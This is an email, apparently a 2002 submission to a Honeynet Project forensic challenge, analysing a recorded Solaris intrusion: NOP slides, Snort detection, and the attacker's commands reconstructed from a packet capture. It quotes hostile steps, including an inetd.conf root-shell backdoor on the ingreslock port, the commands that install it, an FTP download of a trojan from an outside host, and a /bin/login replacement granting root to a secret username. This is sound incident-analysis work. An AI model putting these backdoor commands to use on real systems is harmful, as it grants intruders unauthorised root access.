@@ -1,0 +1,133 @@
+From Ralf.Hildebrandt@charite.de Fri Apr 26 15:27:16 2002
+Date: Thu, 18 Apr 2002 21:47:14 +0200
+From: Ralf Hildebrandt <Ralf.Hildebrandt@charite.de>
+To: project@honeynet.org
+Subject: Scan of the month
+
+* What is a NOP slide, and how is this one different from the NOP slide
+  in the rpc.statd exploit in Scan10?
+
+A NOP slide is a padding with NOP commands before the actual exploit
+code itself. Since the reentry-point isn't known, one can pad the
+exploit code with NOPs. If a run of NOPs is hit, processing continues
+until the real exploit code is hit.
+
+* The attack was on 08 Jan, 2002. Would Snort have generated an alert
+  then for the attack?
+
+Yes. snort has signatures for finding NOPs or equivalents on various
+architectures (vision.rules or shellcode.rules)
+
+The actual signature for that exploit was published around Mon Jan 14
+2002 - 13:50:48 PST; see:
+http://www.ultraviolet.org/mail-archives/snort-users.2002/0346.html
+
+* In the exploit code, the command "/bin/sh sh -i" is given, what is its
+  purpose, and why is 'sh' shown twice?
+
+This is a inetd.conf entry:
+
+There are a lot of different types of backdoors, here I will explain
+TCP/IP port backdoor.
+
+The idea is to make one of the not so frquent ports (like ingreslock
+here) to listen for incoming conections on which if you connect you
+will receive access with r00t ID.
+
+The simple way is to edit /etc/inetd.conf and to insert the following
+line:
+------------------------------------------------------
+ingreslock   stream 	tcp nowait  root         /bin/sh sh -i
+---------------------- cut here ----------------------
+
+This was done this way:
+/bin/ksd -c echo "<line above>" > /tmp/x; \
+/usr/sbin/inetd -s /tmp/x; \
+sleep 10; \
+/bin/rm -f /tmp/x
+
+* The attacker executed a variety of commands on the hacked Solaris box.
+  Which commands were automated by the exploit, which commands were
+  manual by the attacker himself?
+
+At time index 52315.783823 (time index 0 indicates the start of the
+tcpdump recording) the TCP session to the ingreslock port on
+the compromised machine begins. I again used ethereal to follow the
+TCP stream to see the commands executed.
+
+At time index 52315.99 we see the output of the command line:
+uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export
+PATH;echo "BD PID(s): "ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'
+
+Then the next command ("w") is issued at time index 52319.64, almost
+4s later. This indicates that the command was entered interactively.
+
+The next three commands ("unset HISTFILE", "cd /tmp" and "mkdir
+/usr/lib") were issued 28s later -- and together (very fast one after
+the other), also indicating interactive use -- this time via cut & paste
+
+The next command ("ftp 64.224.118.115") was typed at time index
+52357.05, over 30s later. Also interactive use.
+
+The FTP session to retrieve the Solaris binary "sun1"
+was initiated manually but performed so fast that it must have been
+scripted (16:47:04.154798 - 16:47:11.974344 == 7s to login in, change
+the directory and mode and to initiate the download).
+
+After that, all was done manually.
+
+* What is sun1, and how does it work?
+
+I used ethereal to decode the tcpdump session and to follow the FTP
+DATA stream. I then saved "sun1"
+
+% file sun1
+
+sun1: ELF 32-bit MSB executable, SPARC, version 1 (SYSV), statically linked, stripped
+
+The use of "sun1" by the intruder shows that it is a replacement for
+"login" - he used:
+
+# chmod 555 sun1
+# mv sun1 /bin/login
+
+Prior to that he moved the original /bin/login aside (to
+/usr/lib/libfl.k).
+
+"sun1" contains this string as well (see "strings sun1"). So I assume
+that sun1 is some sort of wrapper around the "real" /bin/login
+
+A "truss" of sun1 confirms this.
+
+But what does it do?
+
+Once a user logs in using the Loginname "pirc" he gets superuser
+privleges.
+
+* What did you learn from this exercise?
+
+It's a tedious task, oh my.
+
+* How long did this challenge take you?
+
+3h
+
+* Bonus Question:
+  One of the commands executed during the attack is
+
+  echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}`'
+
+  What is the purpose of this command and what does 'BD' stand for?
+
+This extracts the PID of the shell that was used to inject the BD
+(BackDoor) line into the /etc/inetd.conf. The file that contains the
+line was called /tmp/x, the whole command being "/usr/sbin/inetd -s
+/tmp/x;". Thus grepping for " -s /tmp/x" would locate this in the ps
+output.
+
+--
+Ralf Hildebrandt (Im Auftrag des Referat V A)   Ralf.Hildebrandt@charite.de
+Charite Campus Virchow-Klinikum                 Tel.  +49 (0)30-450 570-155
+Referat V A - Kommunikationsnetze -             Fax.  +49 (0)30-450 570-916
+If you spend more on coffee than on IT security, then you will be
+hacked -- what's more, you deserve to be hacked.
